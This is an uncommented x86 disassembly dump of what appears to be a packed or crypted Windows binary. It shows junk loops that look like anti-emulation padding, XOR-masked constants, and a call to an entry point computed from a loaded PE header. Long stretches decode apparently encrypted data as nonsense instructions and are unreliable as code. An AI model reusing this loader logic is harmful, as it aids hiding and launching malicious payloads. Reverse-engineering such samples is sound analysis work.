  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e658,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x4302c1,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x4302c1
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x4302c1,edx
  4095e8:	cmp    DWORD PTR ds:0x4302c1,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e74d
  409617:	call   DWORD PTR ds:0x42e87b
  40961d:	cmp    DWORD PTR ds:0x4302c1,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e648,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e648
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e648,ecx
  40964a:	cmp    DWORD PTR ds:0x42e648,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42eaaf
  409672:	cmp    DWORD PTR ds:0x42e648,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e644
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x4302dd,0x14
  4098db:	cmp    DWORD PTR ds:0x4302dd,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x4302dd,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42eab3
  40991f:	mov    eax,ds:0x4302dd
  409924:	dec    eax
  409925:	mov    ds:0x4302dd,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x430357
  409934:	or     eax,DWORD PTR ds:0x43035f
  40993a:	mov    ds:0x430357,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e650,0x13
  40994c:	cmp    DWORD PTR ds:0x42e650,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e650,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42eab7
  409979:	mov    ecx,DWORD PTR ds:0x42e650
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e650,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x4302c9,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x4302d9,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x43034f,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x43034f
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x43034f,edi
  4099bf:	cmp    DWORD PTR ds:0x43034f,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x4302bd
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42e947
  4099e8:	cmp    DWORD PTR ds:0x43034f,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x43034f
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x43034f,edi
  409a02:	cmp    DWORD PTR ds:0x43034f,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x43035f,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x4302b5,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x4302b5
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x4302b5,ebx
  409a35:	cmp    DWORD PTR ds:0x4302b5,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e883
  409a50:	cmp    DWORD PTR ds:0x4302b5,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x4302b5
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x4302b5,ebx
  409a6a:	cmp    DWORD PTR ds:0x4302b5,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e648
  409a7d:	or     DWORD PTR ds:0x42ec4b,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	retf   0x575a
  409a97:	iret   
  409a98:	pop    ecx
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a29
  409aa1:	mov    bl,0xb4
  409aa3:	retf   0x4dce
  409aa6:	and    edi,DWORD PTR [eax+esi*4]
  409aa9:	(bad)  
  409aaa:	into   
  409aab:	call   0xd425:0x948749a0
  409ab2:	and    DWORD PTR [esp+ebx*4],ecx
  409ab5:	frstor [edi+esi*2]
  409ab8:	add    ecx,DWORD PTR [esi]
  409aba:	mov    bl,ah
  409abc:	pop    ds
  409abd:	fs cs aas 
  409ac0:	push   ds
  409ac1:	leave  
  409ac2:	dec    edx
  409ac3:	retf   0xf4cb
  409ac6:	pop    ds
  409ac7:	in     al,0xc2
  409ac9:	jmp    0x409a98
  409acb:	dec    ebp
  409acc:	fld    TBYTE PTR [eax-0x7d]
  409acf:	cmp    al,BYTE PTR [ebx-0x1446f691]
  409ad5:	inc    ebx
  409ad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad7:	cmp    al,0xf7
  409ad9:	cmp    bl,BYTE PTR [ebp+0x186c5f0a]
  409adf:	push   edx
  409ae0:	cs js  0x409ad7
  409ae3:	dec    edi
  409ae4:	mov    esi,0xfe2fe159
  409ae9:	jecxz  0x409b04
  409aeb:	inc    ebp
  409aec:	jecxz  0x409aa2
  409aee:	mov    WORD PTR [edx],?
  409af0:	add    eax,0x5237ac99
  409af5:	push   ds
  409af6:	outs   dx,BYTE PTR ds:[esi]
  409af7:	(bad)  [ebx+0x78]
  409afa:	lock int 0xeb
  409afd:	jmp    0xfedf:0xf55dbf24
  409b04:	(bad)  
  409b05:	pop    esp
  409b06:	push   eax
  409b07:	test   BYTE PTR [eax-0x4ed88240],ah
  409b0d:	push   ss
  409b0e:	imul   ecx,DWORD PTR [ecx+0x34],0x7509b658
  409b15:	cmp    dl,BYTE PTR [ebx]
  409b17:	push   ss
  409b18:	or     ch,BYTE PTR [esi]
  409b1a:	aam    0x97
  409b1c:	imul   ebp,DWORD PTR [ecx-0x2fdfa04],0x35
  409b23:	mov    ebx,DWORD PTR [edx]
  409b25:	test   ebp,eax
  409b27:	cmp    al,0xc
  409b29:	adc    ebx,DWORD PTR [ebx+0x1911b067]
  409b2f:	xchg   ecx,eax
  409b30:	out    0x41,eax
  409b32:	fldenv [ebx-0x33]
  409b35:	adc    DWORD PTR [eax],0xffffff95
  409b38:	clc    
  409b39:	cs xor al,0x7b
  409b3c:	clc    
  409b3d:	outs   dx,BYTE PTR ds:[esi]
  409b3e:	push   ebx
  409b3f:	xor    eax,0x13dfc47f
  409b44:	cmp    eax,0xf31dd9e3
  409b49:	cmp    bh,dh
  409b4b:	xor    ch,BYTE PTR [ebp+0x5a04c3c7]
  409b51:	and    ecx,ecx
  409b53:	loope  0x409b7d
  409b55:	fbld   TBYTE PTR ds:0x89057cf9
  409b5b:	fs mov al,0x6b
  409b5e:	cmp    DWORD PTR [ecx-0x6a],0x5cd07310
  409b65:	jne    0x409b3d
  409b67:	test   DWORD PTR [eax-0x17],esp
  409b6a:	leave  
  409b6b:	(bad)  
  409b6c:	cmp    eax,0x96c8ab5e
  409b71:	sar    BYTE PTR [esi],cl
  409b73:	push   edx
  409b74:	mov    al,BYTE PTR [esi]
  409b76:	stc    
  409b77:	push   es
  409b78:	inc    eax
  409b79:	push   edi
  409b7a:	or     esp,edx
  409b7c:	sbb    BYTE PTR [edi],0x63
  409b7f:	loop   0x409b8c
  409b81:	idiv   BYTE PTR [ecx+ebp*1]
  409b84:	vmwrite eax,DWORD PTR [esi+edi*4-0x31]
  409b89:	jg     0x409b69
  409b8b:	pop    ds
  409b8c:	xor    bh,bh
  409b8e:	push   es
  409b8f:	xor    bh,bh
  409b91:	jmp    0x87a4:0x6d6fc3cd
  409b98:	cld    
  409b99:	int3   
  409b9a:	pusha  
  409b9b:	fs jmp 0x9f4b:0x82d7514d
  409ba3:	addr16 mov ebp,0x2de6e51b
  409ba9:	inc    esi
  409baa:	int    0xcf
  409bac:	jmp    0x484e:0x5a127614
  409bb3:	leave  
  409bb4:	aad    0xec
  409bb6:	pop    eax
  409bb7:	add    al,0xc5
  409bb9:	adc    al,0xe
  409bbb:	adc    al,ch
  409bbd:	jmp    0x409b7e
  409bbf:	test   eax,0x26c12270
  409bc4:	xor    ebx,ecx
  409bc6:	stos   BYTE PTR es:[edi],al
  409bc7:	cdq    
  409bc8:	std    
  409bc9:	jno    0x409b63
  409bcb:	pop    esp
  409bcc:	xchg   esi,eax
  409bcd:	sbb    edx,DWORD PTR [esp+ecx*4]
  409bd0:	mov    dh,0xaa
  409bd2:	inc    eax
  409bd3:	outs   dx,BYTE PTR ds:[esi]
  409bd4:	popf   
  409bd5:	popa   
  409bd6:	les    ebp,FWORD PTR [edx-0x6fc4f1e4]
  409bdc:	cmp    eax,DWORD PTR [edi+0x7d]
  409bdf:	xchg   ecx,eax
  409be0:	adc    eax,0xd5a0641f
  409be5:	outs   dx,BYTE PTR ds:[esi]
  409be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409be7:	mov    dh,0x3f
  409be9:	push   ebx
  409bea:	add    edx,eax
  409bec:	pop    esp
  409bed:	ja     0x409c41
  409bef:	in     al,dx
  409bf0:	add    ebp,DWORD PTR [edx+0x74]
  409bf3:	xor    BYTE PTR [ebx+esi*2-0x5cd89e2d],dl
  409bfa:	ins    DWORD PTR es:[edi],dx
  409bfb:	enter  0x5a63,0xdc
  409bff:	repz push ebp
  409c01:	pop    esp
  409c02:	jbe    0x409c43
  409c04:	inc    eax
  409c05:	xor    eax,0x1f3fa6b2
  409c0a:	push   ds
  409c0b:	push   es
  409c0c:	xchg   edi,eax
  409c0d:	dec    ebx
  409c0e:	xchg   edx,eax
  409c0f:	sbb    DWORD PTR [ecx-0x84ff8a0],eax
  409c15:	adc    BYTE PTR [edi],0x7d
  409c18:	retf   0xc9d0
  409c1b:	jl     0x409c38
  409c1d:	ins    DWORD PTR es:[edi],dx
  409c1e:	cmp    DWORD PTR [esi+0x2],ebx
  409c21:	call   0x5976:0x50d1dbfa
  409c28:	or     al,0xd6
  409c2a:	aas    
  409c2b:	pop    ebx
  409c2c:	pop    esi
  409c2d:	jne    0x409c52
  409c2f:	sar    DWORD PTR [edx],1
  409c31:	mov    ds:0x214f06a1,al
  409c36:	pop    ecx
  409c37:	hlt    
  409c38:	fcmove st,st(1)
  409c3a:	lock pop esi
  409c3c:	mov    al,ds:0x2714eb6d
  409c41:	xchg   esi,eax
  409c42:	test   BYTE PTR [ecx-0x5f6779d5],dl
  409c48:	cmc    
  409c49:	(bad)  
  409c4a:	mov    edx,0xc4361109
  409c4f:	mov    WORD PTR [edi],ds
  409c51:	dec    ebp
  409c52:	inc    esp
  409c53:	out    0x0,al
  409c55:	xor    eax,0xd86d9137
  409c5a:	xor    ch,BYTE PTR [edi+0x4d]
  409c5d:	popa   
  409c5e:	pop    ecx
  409c5f:	stc    
  409c60:	(bad)  [edi]
  409c62:	leave  
  409c63:	sub    eax,0x13f2064f
  409c68:	std    
  409c69:	daa    
  409c6a:	jmp    0xddbab905
  409c6f:	push   ss
  409c70:	(bad)  
  409c71:	xor    eax,edi
  409c73:	fcmovnb st,st(5)
  409c75:	xor    al,0xd3
  409c77:	sub    BYTE PTR [edi+edi*1+0x6a],al
  409c7b:	mov    cl,0xb0
  409c7d:	sub    eax,0x9fe9f84
  409c82:	push   edi
  409c83:	add    BYTE PTR cs:[ebx+0x2a],dl
  409c87:	mov    al,ds:0x860e688
  409c8c:	or     dh,bh
  409c8e:	cdq    
  409c8f:	pop    esi
  409c90:	call   0x120d06eb
  409c95:	jbe    0x409c47
  409c97:	jmp    0x409c40
  409c99:	mov    dl,0xaf
  409c9b:	jbe    0x409c43
  409c9d:	and    BYTE PTR [ecx-0x478b8844],dl
  409ca3:	inc    eax
  409ca4:	dec    esi
  409ca5:	loope  0x409c50
  409ca7:	xchg   ch,al
  409ca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409caa:	inc    esi
  409cab:	das    
  409cac:	or     eax,0x150785ee
  409cb1:	xlat   BYTE PTR ds:[ebx]
  409cb2:	test   al,0x51
  409cb4:	mov    ebx,0x3e6a5faf
  409cb9:	aaa    
  409cba:	mov    ebx,esi
  409cbc:	popf   
  409cbd:	arpl   WORD PTR [ebp+0x13],ax
  409cc0:	std    
  409cc1:	cs mov eax,0x3847e7ed
  409cc7:	sbb    edi,edi
  409cc9:	fbld   TBYTE PTR [ebp+0x1a98d45f]
  409ccf:	push   es
  409cd0:	jmp    0xccbe:0x2b21f5d7
  409cd7:	out    dx,al
  409cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cd9:	in     eax,0x2
  409cdb:	adc    BYTE PTR [eax+0x16],al
  409cde:	pushf  
  409cdf:	xchg   DWORD PTR [ebx],edx
  409ce1:	cmp    DWORD PTR [ecx-0x41],ecx
  409ce4:	cld    
  409ce5:	and    al,0xfb
  409ce7:	je     0x409d25
  409ce9:	sub    BYTE PTR [eax-0x4d],0xc6
  409ced:	and    DWORD PTR [ecx],ecx
  409cef:	popa   
  409cf0:	mov    ds:0x4861d25e,eax
  409cf5:	je     0x409cf9
  409cf7:	xor    eax,ebp
  409cf9:	cld    
  409cfa:	scas   eax,DWORD PTR es:[edi]
  409cfb:	push   ebp
  409cfc:	shr    DWORD PTR [ecx],0xef
  409cff:	push   0x546d7163
  409d04:	and    DWORD PTR [esi],ebp
  409d06:	popf   
  409d07:	and    bl,bl
  409d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d0a:	jne    0x409c9c
  409d0c:	fs out dx,eax
  409d0e:	xchg   edx,eax
  409d0f:	(bad)  
  409d10:	sub    al,0x1e
  409d12:	shr    BYTE PTR ds:0xa5db4702,cl
  409d18:	xchg   al,dh
  409d1a:	out    dx,al
  409d1b:	pop    ebx
  409d1c:	inc    ecx
  409d1d:	mov    dl,BYTE PTR [ecx]
  409d1f:	and    eax,DWORD PTR [edx]
  409d21:	aam    0x67
  409d23:	xchg   ebp,eax
  409d24:	mov    esp,0x642030d0
  409d29:	jmp    0x52585b1d
  409d2e:	data16 clc 
  409d30:	nop
  409d31:	popf   
  409d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d33:	xlat   BYTE PTR ds:[ebx]
  409d34:	aam    0x71
  409d36:	xchg   esi,eax
  409d37:	push   edx
  409d38:	es jl  0x409d43
  409d3b:	sti    
  409d3c:	int    0xbf
  409d3e:	jmp    0x79d4ba2
  409d43:	aad    0x45
  409d45:	loopne 0x409cdb
  409d47:	mov    edi,0xae7dabe0
  409d4c:	ret    0xc55e
  409d4f:	je     0x409cdd
  409d51:	mov    dh,0x44
  409d53:	in     al,0xd7
  409d55:	das    
  409d56:	stos   DWORD PTR es:[edi],eax
  409d57:	test   BYTE PTR [esi-0x67b6bc27],dh
  409d5d:	out    dx,eax
  409d5e:	pop    ebp
  409d5f:	ficom  DWORD PTR [ebp+0x3989acb8]
  409d65:	pop    ebp
  409d66:	mov    eax,ds:0x993239b4
  409d6b:	adc    al,0x77
  409d6d:	call   0xc9969909
  409d72:	rcl    BYTE PTR [ecx+0x68],0x62
  409d76:	std    
  409d77:	(bad)  
  409d78:	js     0x409d2e
  409d7a:	sub    DWORD PTR [edi],edx
  409d7c:	add    eax,esi
  409d7e:	aas    
  409d7f:	and    al,0xb3
  409d81:	xchg   ebp,eax
  409d82:	jp     0x409df9
  409d84:	ret    0xb4a4
  409d87:	stc    
  409d88:	iret   
  409d89:	nop
  409d8a:	out    0x25,al
  409d8c:	je     0x409d7b
  409d8e:	cmp    BYTE PTR [esp+esi*2+0x27],ah
  409d92:	jns    0x409d2e
  409d94:	fucomi st,st(2)
  409d96:	pop    ds
  409d97:	push   edx
  409d98:	test   DWORD PTR [ebp-0x73c2724d],eax
  409d9e:	dec    esi
  409d9f:	cmp    al,0x80
  409da1:	adc    BYTE PTR [eax+0x6f],dh
  409da4:	aam    0xc9
  409da6:	or     cl,ah
  409da8:	xchg   ebx,eax
  409da9:	adc    al,0x52
  409dab:	scas   al,BYTE PTR es:[edi]
  409dac:	lds    ebp,FWORD PTR [edx]
  409dae:	jl     0x409e22
  409db0:	outs   dx,BYTE PTR ds:[esi]
  409db1:	sbb    BYTE PTR [ecx],ah
  409db3:	ret    0x15b9
  409db6:	test   DWORD PTR [ebx],edx
  409db8:	dec    ebx
  409db9:	rcl    BYTE PTR [ebp+eax*4-0x48ef4853],cl
  409dc0:	and    eax,0x1fa5d476
  409dc5:	test   al,0x7e
  409dc7:	mov    gs,WORD PTR [ebx+0x107a57f4]
  409dcd:	icebp  
  409dce:	leave  
  409dcf:	clc    
  409dd0:	add    eax,edi
  409dd2:	mov    ebx,DWORD PTR ds:0x42e658
  409dd8:	add    ebx,DWORD PTR ds:0x430357
  409dde:	mov    DWORD PTR ds:0x42e658,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x4302dd,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x43034f,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x4302d1
  409e03:	and    DWORD PTR ds:0x4302f1,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x4302cd,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e43
  409e2b:	es xchg ah,dl
  409e2e:	or     eax,ebx
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e14
  409e37:	hlt    
  409e38:	add    dl,BYTE PTR [ecx]
  409e3a:	test   eax,0xa69d7b7a
  409e3f:	loope  0x409eb5
  409e41:	and    DWORD PTR [esi+0x3],0x3
  409e45:	push   es
  409e46:	inc    esp
  409e47:	cmp    DWORD PTR fs:[edx],ebp
  409e4a:	mov    BYTE PTR [esi],ah
  409e4c:	icebp  
  409e4d:	jnp    0x409e2e
  409e4f:	xchg   esp,eax
  409e50:	mov    ds:0x554b54d5,eax
  409e55:	pop    ebx
  409e56:	xchg   edi,eax
  409e57:	call   0xa816:0x1dd8284
  409e5e:	sub    BYTE PTR [edx-0x2dd24317],al
  409e64:	in     al,dx
  409e65:	fist   DWORD PTR [ebx]
  409e67:	mov    dh,0x75
  409e69:	cli    
  409e6a:	pop    ecx
  409e6b:	clc    
  409e6c:	loop   0x409e1c
  409e6e:	lock push cs
  409e70:	pop    es
  409e71:	xor    dh,BYTE PTR [edx-0x34]
  409e74:	loop   0x409ec3
  409e76:	les    ebx,FWORD PTR [eax-0xd]
  409e79:	push   esi
  409e7a:	jo     0x409ee0
  409e7c:	mov    DWORD PTR [esi-0x39178e83],edi
  409e82:	push   eax
  409e83:	mov    cl,0x7c
  409e85:	mov    dh,0x48
  409e87:	push   eax
  409e88:	(bad)  
  409e89:	mov    bh,0x2f
  409e8b:	cmp    edi,DWORD PTR [ecx+ebx*4+0x33c6b30e]
  409e92:	cmp    esi,DWORD PTR [ebx-0x1890e847]
  409e98:	jo     0x409ef5
  409e9a:	jnp    0x409f19
  409e9c:	ret    0x768b
  409e9f:	arpl   WORD PTR [esi],dx
  409ea1:	lods   al,BYTE PTR ds:[esi]
  409ea2:	shl    DWORD PTR [ebx],0x45
  409ea5:	jae    0x409e6d
  409ea7:	out    dx,eax
  409ea8:	xor    BYTE PTR [edx+0x47],al
  409eab:	mov    ch,0x62
  409ead:	ja     0x409eba
  409eaf:	xchg   ecx,eax
  409eb0:	into   
  409eb1:	les    esp,FWORD PTR ds:0xc5996e90
  409eb7:	jb     0x409ef2
